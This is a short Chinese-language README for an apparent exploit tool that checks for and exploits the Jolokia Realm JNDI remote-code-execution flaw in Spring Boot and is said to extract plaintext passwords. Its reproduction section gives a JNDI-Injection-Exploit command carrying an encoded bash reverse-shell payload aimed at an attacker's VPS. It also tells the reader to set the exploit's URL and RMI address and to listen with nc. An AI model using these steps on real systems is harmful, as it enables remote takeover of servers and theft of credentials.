# jolokia_Realm_JNDI_RCE_Check

jolokia Realm JNDI RCE 漏洞检测，并获取明文密码

![image-20230529125021273](\image\img.png)



#### 漏洞复现



```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64}|{base64,-d}|{bash,-i}" -A "vps"
```

![img1](\image\img1.png)



修改 expliot 中的 url 和 rmi 地址

![img2](\image\img2.png)



nc 监听端口

![img3](\image\img3.png)



#### 参考文章

https://github.com/LandGrey/SpringBootVulExploit#0x05jolokia-realm-jndi-rce

https://zhuanlan.zhihu.com/p/369853014

https://r0yanx.com/tools/java_exec_encode/

https://github.com/welk1n/JNDI-Injection-Exploit

